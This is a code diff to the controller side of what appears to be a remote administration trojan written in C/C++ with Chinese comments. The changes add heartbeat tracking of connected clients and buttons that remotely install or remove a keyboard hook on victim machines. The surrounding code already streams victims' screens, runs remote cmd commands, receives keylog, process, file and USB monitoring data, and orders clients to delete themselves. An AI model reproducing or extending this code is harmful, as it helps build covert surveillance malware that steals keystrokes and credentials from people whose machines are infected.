@@ -62,7 +62,7 @@ struct ClientData
 	HANDLE		 hmutex;		//定义互斥对象句柄（用来同步收到来自客户端的包）
 
 	_Show		stShow;			//显示辅助（）线程参数
-
+	DWORD		dwHearTime;		//心跳检测时间戳
 
 	HWND		hScreenWindow;	//屏幕窗口句柄
 	HANDLE		hScreenThread;	//屏幕显示线程句柄
@@ -85,6 +85,7 @@ HANDLE		 hmutex1;		//定义全局互斥对象句柄（用来同步收到发送到客户端的包）
 HWND hWinMain;					//主窗口句柄
 SOCKET hSocketWait;				//用于等待客户端连接的套接字句柄		
 
+
 BOOL _stdcall _ShowUSB(HWND hWnd);
 BOOL _stdcall _ShowFileControl(HWND hWnd);
 BOOL _stdcall _ShowKey(HWND hWnd);
@@ -93,6 +94,7 @@ BOOL _stdcall _ShowCmd(HWND hWnd);
 BOOL _stdcall _ShowScreen(_Show* lpScreen);
 
 
+BOOL _stdcall _HeartTest();
 BOOL _stdcall _CheckClient();
 VOID _stdcall _InitSocket();
 BOOL _stdcall _ToClient(_Show* lpScreen);
@@ -184,7 +186,8 @@ BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 
 		//创建线程用来循环接收客户端连接
 		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ReceiveClient, NULL, 0, NULL);
-
+		//创建线程用来检测心跳包
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_HeartTest, NULL, 0, NULL);
 
 		break;
 
@@ -194,6 +197,68 @@ BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 
 	return TRUE;
 }
+
+
+//心跳检测线程
+BOOL _stdcall _HeartTest()
+{
+	ClientData* pClient = pHandClient;		//辅助指针
+	ClientData* pClientFront;		//辅助指针
+
+	int i;
+	while (1)
+	{
+		i = 0;
+		pClient = pHandClient;
+		while (pClient != NULL)
+		{
+			if (((GetTickCount() - pClient->dwHearTime) > 1000 * 60) && pClient->dwHearTime != 0)
+			{
+				if (pClient == pHandClient)
+				{
+					SendMessage(pClient->hScreenWindow, WM_CLOSE, 0, 0);								//关闭屏幕显示窗口和线程
+					SendMessage(pClient->hCmdWindow, WM_CLOSE, 0, 0);									//关闭cmd窗口
+					SendMessage(pClient->hKeyWindow, WM_CLOSE, 0, 0);									//关闭键盘窗口
+					ListView_DeleteItem(GetDlgItem(hWinMain, IDC_LIST1), 0);
+
+					pHandClient = pHandClient->Next;
+					delete pClient;
+					pClient = pHandClient;
+					continue;
+				}
+				else
+				{
+					SendMessage(pClient->hScreenWindow, WM_CLOSE, 0, 0);								//关闭屏幕显示窗口和线程
+					SendMessage(pClient->hCmdWindow, WM_CLOSE, 0, 0);									//关闭cmd窗口
+					SendMessage(pClient->hKeyWindow, WM_CLOSE, 0, 0);
+					ListView_DeleteItem(GetDlgItem(hWinMain, IDC_LIST1), i);
+
+					pClientFront->Next = pClient->Next;
+					delete pClient;
+					pClient = pClientFront->Next;
+					continue;
+				}
+			}
+			pClientFront = pClient;
+			pClient = pClient->Next;
+			i++;
+		}
+
+	}
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
 
 
 //网络初始话
@@ -301,7 +366,10 @@ BOOL _stdcall _ReceiveClient()
 		pClient->stWrap.lpBuffer = NULL;
 
 		lpScreen.dwItem = i;
+
+		pClient->dwHearTime = GetTickCount();	//初始化时间戳
 		pClient->hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ToClient, &lpScreen, 0, NULL);					//创建线程来循环接收数据包
+
 
 		memset(&lvItem, 0, sizeof(lvItem));
 		lvItem.mask = LVIF_TEXT;
@@ -357,8 +425,8 @@ BOOL _stdcall _ToClient(_Show* lpScreen)
 		WaitForSingleObject(pClient->hmutex, INFINITE);		//请求互斥对象
 		len = 0;
 		int timeout;
-		timeout = 1000 * 120; //50秒超时recv返回		
-		setsockopt(pClient->hSocketClient, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(int));
+		//timeout = 1000 * 120; //50秒超时recv返回		
+		//setsockopt(pClient->hSocketClient, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(int));
 
 		//接收来自客户端的数据(循环接收)
 		memset(szBuffer, 0, sizeof(szBuffer));
@@ -417,19 +485,22 @@ BOOL _stdcall _ToClient(_Show* lpScreen)
 		pClient->stWrap.dwLength = szBuffer[4] + szBuffer[5] * 0x100 + szBuffer[6] * 0x10000 + szBuffer[7] * 0x1000000;
 		pClient->stWrap.lpBuffer = new BYTE[pClient->stWrap.dwLength + 1]();
 
-		memset(szBuffer, 0, sizeof(szBuffer));
-		len = 0;
-		len1 = 0;
-		while (1)
+		if (pClient->stWrap.dwLength != 0)
 		{
-			len1 = recv(pClient->hSocketClient, (char*)((DWORD)pClient->stWrap.lpBuffer + len), pClient->stWrap.dwLength - len, 0);
-			len = len + len1;
-			if (len == pClient->stWrap.dwLength)
-				break;
+			memset(szBuffer, 0, sizeof(szBuffer));
+			len = 0;
+			len1 = 0;
+			while (1)
+			{
+				len1 = recv(pClient->hSocketClient, (char*)((DWORD)pClient->stWrap.lpBuffer + len), pClient->stWrap.dwLength - len, 0);
+				len = len + len1;
+				if (len == pClient->stWrap.dwLength)
+					break;
+			}
 		}
-
 		ReleaseMutex(pClient->hmutex);						//释放互斥对象
 		ReleaseMutex(pClient->hmutex);						//释放互斥对象
+		Sleep(2);
 		WaitForSingleObject(pClient->hmutex, INFINITE);		//请求互斥对象
 
 
@@ -438,31 +509,38 @@ BOOL _stdcall _ToClient(_Show* lpScreen)
 
 		switch (pClient->stWrap.dwType)						//处理各种消息
 		{
+		case TO_CLIENT_CMD:
+			SendMessage(pClient->hCmdWindow, WM_OWN_SHOWCMD, 0, 0);
+			break;
 		case TO_CLIENT_SCREEN:				//屏幕包
-			stSendWrap.dwType = GET_CLIENT_SCREEN;				//发送命令。（截屏）
+			stSendWrap.dwType = GET_CLIENT_SCREEN;							//得到屏幕包后立即请求下一个屏幕包
 			stSendWrap.dwLength = 0;
 			WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
 			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);
 			ReleaseMutex(hmutex1);						//释放互斥对象1
 			break;
-		case TO_CLIENT_CMD:
-			SendMessage(pClient->hCmdWindow, WM_OWN_SHOWCMD, 0, 0);
-			break;
-		case 40001:
-			SendMessage(pClient->hCmdWindow, WM_OWN_SHOWPROCESS, 0, 0);
-			break;
-		case TO_CLIENT_KEY:
+		case TO_CLIENT_KEY:					//键盘记录包
 			SendMessage(pClient->hKeyWindow, WM_OWN_KEY, 0, 0);
 			break;
-
-		case 50001:
+		case 40001:							//进程信息包
+			SendMessage(pClient->hCmdWindow, WM_OWN_SHOWPROCESS, 0, 0);
+			break;
+		case 50001:							//文件监控包
 			SendMessage(pClient->hKeyWindow, WM_OWN_FILECONTROL, 0, 0);
 			break;
-		case 60001:
+		case 60001:							//USB监控包
 			SendMessage(pClient->hKeyWindow, WM_OWN_USB, 0, 0);
+			break;
+		case 90001:							//心跳包
+			stSendWrap.dwType = 90002;										//回复心跳检测包
+			stSendWrap.dwLength = 0;
+			WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
+			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);
+			ReleaseMutex(hmutex1);						//释放互斥对象1
 			break;
 		}
 
+		pClient->dwHearTime = GetTickCount();		//更新心跳时间戳
 		delete[] pClient->stWrap.lpBuffer;			//释放内存
 	}
 	return 0;
@@ -639,7 +717,7 @@ BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 	case WM_COMMAND:
 		switch (LOWORD(wParam))
 		{
-		case IDC_BUTTON1:
+		case IDC_BUTTON1:					//文件目录监控
 			pClient = pHandClient;
 			while (pClient != NULL)
 			{
@@ -652,6 +730,38 @@ BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 					WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
 					send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求执行cmd
 					send(pClient->hSocketClient, szBuffer, stSendWrap.dwLength, 0);
+					ReleaseMutex(hmutex1);						//释放互斥对象1
+
+				}
+				pClient = pClient->Next;
+			}
+			break;
+		case IDC_BUTTON2:					//安装键盘钩子
+			pClient = pHandClient;
+			while (pClient != NULL)
+			{
+				if (pClient->hKeyWindow == hWnd)
+				{
+					stSendWrap.dwType = 30002;
+					stSendWrap.dwLength = 0;
+					WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
+					send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求安装键盘钩子
+					ReleaseMutex(hmutex1);						//释放互斥对象1
+
+				}
+				pClient = pClient->Next;
+			}
+			break;
+		case IDC_BUTTON3:					//卸载键盘钩子
+			pClient = pHandClient;
+			while (pClient != NULL)
+			{
+				if (pClient->hKeyWindow == hWnd)
+				{
+					stSendWrap.dwType = 30003;
+					stSendWrap.dwLength = 0;
+					WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
+					send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求卸载键盘钩子
 					ReleaseMutex(hmutex1);						//释放互斥对象1
 
 				}
@@ -679,6 +789,8 @@ BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 
 
 
+
+
 //其他功能窗口过程
 BOOL CALLBACK _DialogOther(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 {
@@ -698,15 +810,15 @@ BOOL CALLBACK _DialogOther(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam
 			ReleaseMutex(hmutex1);						//释放互斥对象1
 			break;
 		case IDC_BUTTON2:
-			stSendWrap.dwType = 80002;
+			stSendWrap.dwType = 70001;
 			stSendWrap.dwLength = 0;
 
 			WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
-			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求重启自删除
+			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求立即自删除
 			ReleaseMutex(hmutex1);						//释放互斥对象1
 			break;
 		case IDC_BUTTON3:
-			stSendWrap.dwType = 90001;
+			stSendWrap.dwType = 80001;
 			stSendWrap.dwLength = 0;
 
 			WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
@@ -714,7 +826,7 @@ BOOL CALLBACK _DialogOther(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam
 			ReleaseMutex(hmutex1);						//释放互斥对象1
 			break;
 		case IDC_BUTTON4:
-			stSendWrap.dwType = 90002;
+			stSendWrap.dwType = 80002;
 			stSendWrap.dwLength = 0;
 
 			WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
